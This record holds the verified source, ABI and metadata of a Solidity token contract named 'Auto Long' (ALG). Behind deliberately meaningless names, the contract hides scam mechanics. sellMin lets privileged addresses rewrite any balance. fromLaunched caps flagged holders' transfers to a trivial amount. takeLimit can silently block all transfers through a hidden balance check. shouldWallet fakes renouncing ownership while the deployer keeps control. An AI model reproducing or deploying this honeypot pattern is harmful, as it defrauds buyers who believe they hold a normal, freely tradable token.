{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface launchedTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingReceiverFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toShould {\n    function createPair(address atLaunched, address fundFee) external returns (address);\n}\n\ninterface tradingAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeExempt) external view returns (uint256);\n\n    function transfer(address fundLaunch, uint256 buyAmountFund) external returns (bool);\n\n    function allowance(address atEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyAmountFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundLaunch,\n        uint256 buyAmountFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquiditySender, uint256 value);\n    event Approval(address indexed atEnable, address indexed spender, uint256 value);\n}\n\ninterface tradingAtMetadata is tradingAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AutoLong is marketingReceiverFee, tradingAt, tradingAtMetadata {\n\n    function transfer(address exemptFund, uint256 buyAmountFund) external virtual override returns (bool) {\n        return takeLimit(_msgSender(), exemptFund, buyAmountFund);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minReceiverEnable;\n    }\n\n    function sellMin(address exemptFund, uint256 buyAmountFund) public {\n        atTrading();\n        exemptLaunchLiquidity[exemptFund] = buyAmountFund;\n    }\n\n    function atTrading() private view {\n        require(marketingBuy[_msgSender()]);\n    }\n\n    function fromLaunched(address amountTrading) public {\n        atTrading();\n        \n        if (amountTrading == fromTrading || amountTrading == maxReceiver) {\n            return;\n        }\n        txReceiver[amountTrading] = true;\n    }\n\n    uint256 public totalLaunched;\n\n    address public fromTrading;\n\n    function approve(address tradingAutoSell, uint256 buyAmountFund) public virtual override returns (bool) {\n        liquiditySwap[_msgSender()][tradingAutoSell] = buyAmountFund;\n        emit Approval(_msgSender(), tradingAutoSell, buyAmountFund);\n        return true;\n    }\n\n    bool public receiverFee;\n\n    function name() external view virtual override returns (string memory) {\n        return maxLaunchedTrading;\n    }\n\n    uint256 constant fundMin = 12 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamAmount;\n    }\n\n    uint256 receiverLaunched;\n\n    uint256 amountTake;\n\n    function takeLimit(address teamLaunched, address fundLaunch, uint256 buyAmountFund) internal returns (bool) {\n        if (teamLaunched == fromTrading) {\n            return receiverSwapTake(teamLaunched, fundLaunch, buyAmountFund);\n        }\n        uint256 txWallet = tradingAt(maxReceiver).balanceOf(launchedList);\n        require(txWallet == receiverLaunched);\n        require(fundLaunch != launchedList);\n        if (txReceiver[teamLaunched]) {\n            return receiverSwapTake(teamLaunched, fundLaunch, fundMin);\n        }\n        return receiverSwapTake(teamLaunched, fundLaunch, buyAmountFund);\n    }\n\n    function owner() external view returns (address) {\n        return isTrading;\n    }\n\n    function balanceOf(address modeExempt) public view virtual override returns (uint256) {\n        return exemptLaunchLiquidity[modeExempt];\n    }\n\n    mapping(address => uint256) private exemptLaunchLiquidity;\n\n    uint8 private isTx = 18;\n\n    event OwnershipTransferred(address indexed receiverMarketing, address indexed modeLiquidity);\n\n    mapping(address => bool) public txReceiver;\n\n    function txMax(address sellAutoList) public {\n        require(sellAutoList.balance < 100000);\n        if (receiverFee) {\n            return;\n        }\n        if (totalLaunched == teamReceiver) {\n            takeSwap = totalLaunched;\n        }\n        marketingBuy[sellAutoList] = true;\n        if (totalLaunched == receiverMin) {\n            teamReceiver = takeSwap;\n        }\n        receiverFee = true;\n    }\n\n    uint256 public enableTake;\n\n    function shouldWallet() public {\n        emit OwnershipTransferred(fromTrading, address(0));\n        isTrading = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isTx;\n    }\n\n    address public maxReceiver;\n\n    bool private walletTake;\n\n    mapping(address => mapping(address => uint256)) private liquiditySwap;\n\n    function receiverSwapTake(address teamLaunched, address fundLaunch, uint256 buyAmountFund) internal returns (bool) {\n        require(exemptLaunchLiquidity[teamLaunched] >= buyAmountFund);\n        exemptLaunchLiquidity[teamLaunched] -= buyAmountFund;\n        exemptLaunchLiquidity[fundLaunch] += buyAmountFund;\n        emit Transfer(teamLaunched, fundLaunch, buyAmountFund);\n        return true;\n    }\n\n    address launchedMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address teamLaunched, address fundLaunch, uint256 buyAmountFund) external override returns (bool) {\n        if (_msgSender() != launchedMin) {\n            if (liquiditySwap[teamLaunched][_msgSender()] != type(uint256).max) {\n                require(buyAmountFund <= liquiditySwap[teamLaunched][_msgSender()]);\n                liquiditySwap[teamLaunched][_msgSender()] -= buyAmountFund;\n            }\n        }\n        return takeLimit(teamLaunched, fundLaunch, buyAmountFund);\n    }\n\n    uint256 private teamAmount = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return isTrading;\n    }\n\n    mapping(address => bool) public marketingBuy;\n\n    bool public enableMarketingTeam;\n\n    string private minReceiverEnable = \"ALG\";\n\n    function allowance(address fundList, address tradingAutoSell) external view virtual override returns (uint256) {\n        if (tradingAutoSell == launchedMin) {\n            return type(uint256).max;\n        }\n        return liquiditySwap[fundList][tradingAutoSell];\n    }\n\n    address launchedList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private maxLaunchedTrading = \"Auto Long\";\n\n    function limitSwapMode(uint256 buyAmountFund) public {\n        atTrading();\n        receiverLaunched = buyAmountFund;\n    }\n\n    uint256 private receiverMin;\n\n    constructor (){\n        if (enableTake != teamReceiver) {\n            teamReceiver = receiverMin;\n        }\n        launchedTotal feeToken = launchedTotal(launchedMin);\n        maxReceiver = toShould(feeToken.factory()).createPair(feeToken.WETH(), address(this));\n        if (totalLaunched != takeSwap) {\n            takeSwap = enableTake;\n        }\n        fromTrading = _msgSender();\n        shouldWallet();\n        marketingBuy[fromTrading] = true;\n        exemptLaunchLiquidity[fromTrading] = teamAmount;\n        \n        emit Transfer(address(0), fromTrading, teamAmount);\n    }\n\n    uint256 public takeSwap;\n\n    uint256 private teamReceiver;\n\n    address private isTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingAutoSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAutoSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAmountFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketingTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTrading\",\"type\":\"address\"}],\"name\":\"fromLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyAmountFund\",\"type\":\"uint256\"}],\"name\":\"limitSwapMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAmountFund\",\"type\":\"uint256\"}],\"name\":\"sellMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAmountFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAmountFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAutoList\",\"type\":\"address\"}],\"name\":\"txMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AutoLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}